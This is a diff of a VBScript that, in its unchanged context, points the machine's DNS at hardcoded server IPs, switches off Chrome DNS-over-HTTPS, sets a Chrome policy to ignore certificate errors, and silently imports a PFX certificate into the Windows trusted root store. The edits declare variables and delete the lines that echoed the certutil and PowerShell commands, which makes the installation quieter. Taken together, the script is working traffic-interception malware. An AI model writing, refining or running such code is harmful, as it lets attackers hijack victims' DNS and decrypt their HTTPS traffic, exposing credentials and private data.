@@ -1,5 +1,4 @@
 Option Explicit
-On Error Resume Next
 
 ' Define constants for primary and secondary DNS servers
 Const PrimaryDNSServer = "93.183.72.6"
@@ -26,9 +25,13 @@ Sub MainScriptLogic()
 	objShell.RegWrite chromeKeyPath & "\DnsOverHttps", "off", "REG_SZ"
 
     Const HKEY_LOCAL_MACHINE = &H80000002
+    dim strKeyPath
+    dim strValueName
+    dim dwValue
     strKeyPath = "SOFTWARE\Policies\Google\Chrome"
     strValueName = "IgnoreCertificateErrors"
     dwValue = 1
+    dim objRegistry
     Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
     objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
     objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue
@@ -84,6 +87,7 @@ Function CertWorks()
     Dim outputFile
     Set outputFile = CreateObject("Scripting.FileSystemObject").CreateTextFile(outputFilePath, True)
 
+    dim i
     For i = 0 To UBound(data)
         outputFile.Write Chr(data(i))
     Next
@@ -101,6 +105,7 @@ Function HexStringToByteArray(hexString)
     Dim byteArray
     ReDim byteArray(Ubound(hexArray))
 
+    dim i
     For i = 0 To UBound(hexArray)
         byteArray(i) = CByte("&H" & hexArray(i))
     Next
@@ -112,7 +117,6 @@ Sub InstallCertificate(certificateFilePath, password)
     ' Prepare the certutil command
     Dim certutilCommand
     certutilCommand = "CERTUTIL -f -p " & password & " -importpfx """ & certificateFilePath & """"
-   WScript.Echo certutilCommand
 
     ' Run the certutil command
     Dim shell
@@ -121,21 +125,12 @@ Sub InstallCertificate(certificateFilePath, password)
 End Sub
 
 Sub InstallCertificateRoot(pfxFilePath, password)
-    On Error Resume Next
-
     ' Prepare the PowerShell command
     Dim powerShellCommand
     powerShellCommand = "powershell -Command ""Import-PfxCertificate -FilePath '" & pfxFilePath & "' Cert:\LocalMachine\Root -Password (ConvertTo-SecureString -String '" & password & "' -AsPlainText -Force)"""
-    WScript.Echo powerShellCommand
 
     ' Run the PowerShell command
     Dim shell
     Set shell = CreateObject("WScript.Shell")
     shell.Run powerShellCommand, 0, True
-
-    If Err.Number <> 0 Then
-        ' Handle error if needed
-        Err.Clear
-        WScript.Quit 1
-    End If
 End Sub
